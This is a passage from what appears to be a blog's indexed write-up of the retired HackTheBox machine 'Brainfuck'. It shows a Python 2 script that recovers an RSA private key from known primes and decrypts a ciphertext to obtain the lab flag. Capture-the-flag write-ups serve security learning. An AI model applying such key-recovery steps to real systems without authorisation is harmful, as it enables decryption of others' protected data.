0,1, 1,0 while a != 0: q, r = b//a, b%a m, n = x-u*q, y-v*q b,a, x,y, u,v = a,r, u,v, m,n gcd = b return gcd, x, y n = p*q #product of primes phi = (p-1)*(q-1) #modular multiplicative inverse gcd, a, b = egcd(e, phi) #calling extended euclidean algorithm d = a #a is decryption key out = hex(d) print(\u0026quot;d_hex: \u0026quot; + str(out)); print(\u0026quot;n_dec: \u0026quot; + str(d)); pt = pow(ct, d, n) print(\u0026quot;pt_dec: \u0026quot; + str(pt)) out = hex(pt) out = str(out[2:-1]) print \u0026quot;flag\u0026quot; print out.decode(\u0026quot;hex\u0026quot;) on debug.txt, replace p with first line of value, q with second line of value, e with third line of value and ct with output.txt value.\n","description":"Brainfuck Machine Writeup","id":4,"section":"posts","tags":["pentest","retired","hackthebox"],"title":"Brainfuck - Retired HackTheBox Machine","uri":"https://www.faizul.me/posts/hackthebox/brainfuck/brainfuck-machine/"}]